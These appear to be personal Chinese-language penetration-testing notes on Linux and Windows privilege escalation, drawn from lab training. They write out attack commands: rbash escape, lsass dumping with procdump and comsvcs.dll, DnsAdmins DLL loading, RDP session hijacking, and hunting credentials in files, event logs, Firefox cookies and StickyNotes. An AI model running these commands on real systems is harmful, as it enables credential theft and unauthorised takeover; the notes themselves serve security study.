在此我依然记录一些细节和以前曾忽略的东西

# Linux Privilege Escalation

## 其他用户可写文件或文件夹

	find / -type f -perm -o+w 2>/dev/null
	find / -type d -perm -o+w 2>/dev/null

我们确实不应该忽略other可写的文件和文件夹，我们之前只寻找相关组或用户的，但其实具有其他用户可写权限的也都值得注意，当然这也可能会在-writable参数中有所体现。

## lsblk查看挂载的共享

## 受限shell逃逸

在环境变量正常的情况下，我们通常直接利用环境变量可以逃逸出rbash

	bash -> /usr/bin/bash

但如果环境变量都被清干净之后，并且通常我们无法恢复环境变量，那么这种方法也就废了。

我们可以通过scp传递可用二进制文件到我们登录进去的目录

又或者通过ssh执行命令来提前进入bash

	ssh hacker@localhost -t bash

这样我们就可以直接获得bash从而逃逸出rbash

## 共享对象劫持

通过ldd和readelf查看有没有从其他目录加载so，如果有，并且目录可写，那么可以直接劫持

# Windows Privilege Escalation

## 查看AppLocker策略

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## 枚举服务

最常用的枚举所有服务常见的应该就这几种

	tasklist /svc
	wmic service
	Get-Service
	sc query state=all
	Get-WmiObject -Class Win32_Service

这些都能够帮助快速获取所有服务的信息

## rdp会话劫持

通过query user查看会话，通过tscon连接对应的rdp类型的会话

	tscon <sessionID> /dest:name

其实这个在THM早已有讲述，当在server 2019以后的版本都需要输入密码才能连接，这意味着这种劫持方式可能不会太奏效，但在2019版本以前，我们依然可以尽管尝试

## SeDebugPrivilege

拥有此特权，那将有两种利用方法

1) 转储lsass

	1. 通过进程管理器
	2. prodump
		```cmd
		procdump.exe -accepteula -ma lsass.exe lsass.dmp
		```
	3. comsvcs.dll
		```cmd
		rundll32 C:\Windows\System32\Comsvcs.dll,MiniDump PID lsass.dmp full
		```

2) 通过修改任意SYSTEM进程属性将任意进程设置为其子进程，从而继承其access token

	https://decoder.cloud/2018/02/02/getting-system/

## Event Log Readers Group

如果我们在此组，那么可以尝试读取任何4688事件的日志，它记录着新进程创建事件，这也意味着通过命令行传入的一切参数也都将被捕获

```powershell
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

## DnsAdmins Group

在该组，我们应该能够控制dns服务，这在dns服务在DC上应该是非常常见

dns服务有一个属性ServerLevelPluginDll，根据微软官方文档的描述，该属性能够为我们加载任意dll

我们可以通过手动修改注册表：

	reg add HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters /v ServerLevelPluginDll /t REG_SZ /d <dll绝对路径> /f

或者通过dnscmd设置：

	dnscmd /config /serverlevelplugindll <dll绝对路径>

这里值得注意的是，dnscmd本质上也是直接修改注册表，所以这里必须得是绝对路径，否则dns服务可能无法从相对路径找到文件

	sc stop dns
	sc start dns

重启dns服务后，dll将被加载

## 善于SharpUp和PowerUp以节省时间

## 文件搜索

	findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
	gci -Path C:\ -Include *.txt, *.ini, *.cfg, *.config, *.xml -Recurse -ErrorAction SilentlyContinue

## StickyNotes数据库

	C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

## cmdkey - RDP

cmdkey /list存放了凭据，如果用户借此来无需输入密码登录rdp的话，那么我们也将能够利用此凭据登录rdp

## 恶意lnk 细节

在server 2019版本的测试当中，当通过windows资源管理器访问恶意lnk文件所在目录时，将会自动访问UNC path，即：无需直接执行lnk，即可达到目的。

说明windows资源管理器在当你访问到这个目录的时候就已经开始请求文件，但并不会执行它，所以我们也只能获取hash

## FireFox cookie

	$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite

## 不再受支持的老系统漏洞利用

尽管老系统已经不再受支持，但仍然有部分企业为了稳定性而不选择系统的更新迭代，像地方政府单位、部分中小学甚至是高校，所以当遇到这些老系统时，老漏洞仍然值得搜寻

	https://github.com/rasta-mouse/Sherlock
